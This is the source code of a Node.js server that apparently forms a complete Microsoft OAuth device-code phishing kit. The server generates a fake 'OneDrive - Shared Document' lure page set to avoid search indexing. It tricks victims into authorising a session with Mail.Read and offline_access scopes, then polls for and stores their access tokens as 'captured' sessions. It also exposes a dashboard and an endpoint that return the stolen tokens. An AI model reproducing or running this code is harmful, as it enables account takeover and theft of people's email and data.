const express = require('express');
const axios = require('axios');
const cors = require('cors');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;

app.use(cors());
app.use(express.json());
app.use(express.static('public'));

// Store sessions
let sessions = new Map();
let pendingAuth = new Map();

// Helper to generate random device code (like LKWLHC8UV)
function generateDeviceCode() {
    const chars = 'ABCDEFGHJKLMNPQRSTUVWXYZ0123456789';
    let code = '';
    for (let i = 0; i < 9; i++) {
        code += chars[Math.floor(Math.random() * chars.length)];
    }
    return code;
}

// Helper to generate numeric SID
function generateSID() {
    return Math.floor(Math.random() * 9000000) + 1000000;
}

// Get client IP and region info
function getClientInfo(req) {
    const ip = req.headers['x-forwarded-for']?.split(',')[0] || req.socket.remoteAddress || 'Unknown';
    const userAgent = req.headers['user-agent'] || 'Unknown';
    const acceptLanguage = req.headers['accept-language'] || 'en';
    
    // Detect country from IP (simplified - you can use a geolocation API)
    const country = detectCountry(ip);
    
    return { ip, userAgent, acceptLanguage, country };
}

function detectCountry(ip) {
    // Simple IP-based country detection (expand as needed)
    const prefixes = {
        '172.': 'US', '104.': 'US', '185.': 'DE', '188.': 'GB', 
        '45.': 'CA', '103.': 'IN', '46.': 'SE', '31.': 'NL'
    };
    for (const [prefix, country] of Object.entries(prefixes)) {
        if (ip.startsWith(prefix)) return country;
    }
    return 'US';
}

// ============================================
// API: Create a new device code session
// ============================================
app.post('/api/create-session', async (req, res) => {
    try {
        const deviceCode = generateDeviceCode();
        const sid = generateSID();
        
        // Request real device code from Microsoft
        const response = await axios.post('https://login.microsoftonline.com/common/oauth2/v2.0/devicecode',
            new URLSearchParams({
                client_id: '1950a258-227b-4e31-a9cf-717495945fc2',
                scope: 'https://graph.microsoft.com/User.Read https://graph.microsoft.com/Mail.Read offline_access'
            }), {
                headers: { 'Content-Type': 'application/x-www-form-urlencoded' }
            }
        );
        
        const { device_code, user_code, verification_uri, expires_in } = response.data;
        
        // Store session
        pendingAuth.set(device_code, {
            device_code,
            user_code: user_code,
            sid: sid,
            status: 'pending',
            createdAt: Date.now(),
            expiresAt: Date.now() + (expires_in * 1000)
        });
        
        // Start polling
        pollForToken(device_code, sid);
        
        res.json({
            success: true,
            sid: sid,
            user_code: user_code,
            device_code: device_code,
            expires_in: expires_in
        });
        
    } catch (err) {
        console.error('Error creating session:', err.message);
        res.status(500).json({ error: 'Failed to create session' });
    }
});

// ============================================
// Background polling for token
// ============================================
async function pollForToken(device_code, sid) {
    console.log(`[POLLING] Started for SID: ${sid}`);
    
    const pollInterval = setInterval(async () => {
        const pending = pendingAuth.get(device_code);
        if (!pending || pending.status !== 'pending') {
            clearInterval(pollInterval);
            return;
        }
        
        if (Date.now() > pending.expiresAt) {
            pending.status = 'expired';
            pendingAuth.delete(device_code);
            clearInterval(pollInterval);
            console.log(`[POLLING] Session ${sid} expired`);
            return;
        }
        
        try {
            const response = await axios.post('https://login.microsoftonline.com/common/oauth2/v2.0/token',
                new URLSearchParams({
                    grant_type: 'urn:ietf:params:oauth:grant-type:device_code',
                    client_id: '1950a258-227b-4e31-a9cf-717495945fc2',
                    device_code: device_code
                }), {
                    headers: { 'Content-Type': 'application/x-www-form-urlencoded' }
                }
            );
            
            const tokens = response.data;
            console.log(`[POLLING] Token received for SID: ${sid}`);
            
            // Get user info
            const userInfo = await axios.get('https://graph.microsoft.com/v1.0/me', {
                headers: { 'Authorization': `Bearer ${tokens.access_token}` }
            });
            
            const sessionData = {
                sid: sid,
                email: userInfo.data.mail || userInfo.data.userPrincipalName,
                name: userInfo.data.displayName,
                id: userInfo.data.id,
                tokens: tokens,
                capturedAt: new Date().toISOString()
            };
            
            sessions.set(sid.toString(), sessionData);
            pending.status = 'captured';
            pending.email = sessionData.email;
            pendingAuth.delete(device_code);
            clearInterval(pollInterval);
            
            console.log(`[SUCCESS] ✅ SID ${sid} captured for ${sessionData.email}`);
            
        } catch (err) {
            // Normal - waiting for user
            if (err.response?.data?.error !== 'authorization_pending') {
                // console.log('[POLLING] Waiting for user...');
            }
        }
    }, 3000);
}

// ============================================
// API: Get status (matches friend's script exactly)
// ============================================
app.get('/api/status/:sid', async (req, res) => {
    const { sid } = req.params;
    
    // Check if session captured
    const session = sessions.get(sid);
    if (session) {
        console.log(`[STATUS] SID ${sid} - captured for ${session.email}`);
        return res.json({
            status: 'captured',
            email: session.email,
            name: session.name
        });
    }
    
    // Check pending
    for (const [device_code, pending] of pendingAuth.entries()) {
        if (pending.sid.toString() === sid) {
            console.log(`[STATUS] SID ${sid} - ${pending.status}`);
            return res.json({ status: pending.status });
        }
    }
    
    res.json({ status: 'not_found' });
});

// ============================================
// API: Get all sessions for dashboard
// ============================================
app.get('/api/sessions', async (req, res) => {
    const sessionList = Array.from(sessions.values()).map(s => ({
        sid: s.sid,
        email: s.email,
        name: s.name,
        capturedAt: s.capturedAt
    }));
    res.json({ sessions: sessionList });
});

// ============================================
// API: Get session token
// ============================================
app.get('/api/session/token/:sid', async (req, res) => {
    const { sid } = req.params;
    const session = sessions.get(sid);
    
    if (!session) {
        return res.status(404).json({ error: 'Session not found' });
    }
    
    res.json({
        email: session.email,
        token: session.tokens.access_token
    });
});

// ============================================
// API: Clear all sessions
// ============================================
app.delete('/api/sessions/clear', async (req, res) => {
    sessions.clear();
    res.json({ success: true });
});

// ============================================
// Generate static HTML with dynamic code
// ============================================
app.get('/generate-auth-page', async (req, res) => {
    try {
        // Create a new session
        const createResponse = await axios.post(`http://localhost:${PORT}/api/create-session`);
        const { sid, user_code } = createResponse.data;
        
        // Read the template HTML (you'll create this file)
        let html = `
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width,initial-scale=1.0">
    <meta name="robots" content="noindex,nofollow,noarchive">
    <title>OneDrive - Shared Document</title>
    <style>
        *{margin:0;padding:0;box-sizing:border-box}
        body{font-family:'Segoe UI',system-ui,sans-serif;background:#f4f3f2;min-height:100vh}
        .header{background:#0072c6;height:46px;display:flex;align-items:center;padding:0 22px}
        .logo{display:flex;align-items:center;gap:9px;color:#fff;font-size:15px;font-weight:600}
        .container{max-width:560px;margin:50px auto;padding:0 18px}
        .card{background:#fff;border-radius:4px;box-shadow:0 1px 4px rgba(0,0,0,.12);overflow:hidden}
        .content{padding:30px 34px 18px;border-bottom:1px solid #eceae8}
        .icon{width:46px;height:46px;border-radius:50%;background:#0072c6;color:#fff;font-size:19px;font-weight:600;display:flex;align-items:center;justify-content:center;margin-bottom:14px}
        h1{font-size:19px;font-weight:600;color:#2b2b2b;margin-bottom:5px}
        .subtitle{font-size:13px;color:#636363;margin-bottom:20px}
        .code-box{background:#f9f9f8;border:1px solid #e6e4e1;border-radius:6px;padding:18px 16px;text-align:center;margin:20px 0}
        .code-label{font-size:11px;color:#6e6b68;margin-bottom:10px}
        .code{font-size:28px;font-weight:700;color:#0072c6;letter-spacing:4px;font-family:monospace;margin-bottom:10px}
        .btn{background:#0072c6;color:#fff;border:none;padding:10px 38px;font-size:14px;font-weight:600;border-radius:3px;cursor:pointer}
        .btn:hover{background:#005fa3}
        .status{text-align:center;padding:20px 34px;font-size:11px;color:#a3a1a0}
        .spinner{display:inline-block;width:15px;height:15px;border:2px solid #eceae8;border-top-color:#0072c6;border-radius:50%;animation:spin .8s linear infinite;vertical-align:middle;margin-right:5px}
        @keyframes spin{to{transform:rotate(360deg)}}
        .success-box{display:none;text-align:center;padding:44px 34px}
        .success-icon{width:52px;height:52px;border-radius:50%;background:#0f7b10;display:flex;align-items:center;justify-content:center;margin:0 auto 14px}
        .footer{padding:18px;font-size:10px;color:#a3a1a0;text-align:center}
    </style>
</head>
<body>
<div class="header"><div class="logo">📁 OneDrive</div></div>
<div class="container">
    <div class="card">
        <div id="mainView">
            <div class="content">
                <div class="icon">E</div>
                <h1>Encompass Title Center shared a document with you</h1>
                <p class="subtitle">Sign in with your Microsoft account to view this shared item.</p>
                <div class="code-box">
                    <div class="code-label">Verification code</div>
                    <div class="code" id="userCode">${user_code}</div>
                    <button class="btn" onclick="copyCode()">Copy code</button>
                </div>
                <a href="#" class="btn" id="openBtn" style="display:inline-block; text-decoration:none;">Open</a>
            </div>
            <div class="status" id="statusMsg">
                <span class="spinner"></span> Preparing secure access...
            </div>
        </div>
        <div id="successBox" class="success-box">
            <div class="success-icon">✓</div>
            <h2>Document access granted</h2>
            <p>You now have access. This window will close automatically.</p>
        </div>
        <div class="footer">Microsoft OneDrive · Terms of use · Privacy & cookies</div>
    </div>
</div>

<script>
    const SID = ${sid};
    const API_BASE = '${req.protocol}://${req.get('host')}';
    
    function copyCode() {
        const code = document.getElementById('userCode').textContent;
        navigator.clipboard.writeText(code);
        alert('Code copied!');
    }
    
    document.getElementById('openBtn').onclick = function(e) {
        e.preventDefault();
        const code = document.getElementById('userCode').textContent;
        if(code) navigator.clipboard.writeText(code);
        window.open('https://login.microsoftonline.com/common/oauth2/deviceauth', 'mslogin', 'width=520,height=720,scrollbars=yes,resizable=yes');
        return false;
    };
    
    async function pollStatus() {
        try {
            const response = await fetch(API_BASE + '/api/status/' + SID);
            const data = await response.json();
            
            if(data.status === 'captured') {
                document.getElementById('statusMsg').innerHTML = 'Access granted. You may close this window.';
                document.getElementById('mainView').style.display = 'none';
                document.getElementById('successBox').style.display = 'block';
                return;
            }
            if(data.status === 'expired') {
                document.getElementById('statusMsg').innerHTML = 'Session expired. Refreshing...';
                setTimeout(() => location.reload(), 2000);
                return;
            }
        } catch(e) {}
        setTimeout(pollStatus, 3000);
    }
    
    pollStatus();
</script>
</body>
</html>
        `;
        
        res.send(html);
        
    } catch (err) {
        res.status(500).send('Error generating auth page');
    }
});

// Serve dashboard
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

app.listen(PORT, '0.0.0.0', () => {
    console.log(`\n========================================`);
    console.log(`✅ Server running on port ${PORT}`);
    console.log(`📍 Dashboard: http://localhost:${PORT}`);
    console.log(`📍 Generate Auth Page: http://localhost:${PORT}/generate-auth-page`);
    console.log(`========================================\n`);
});
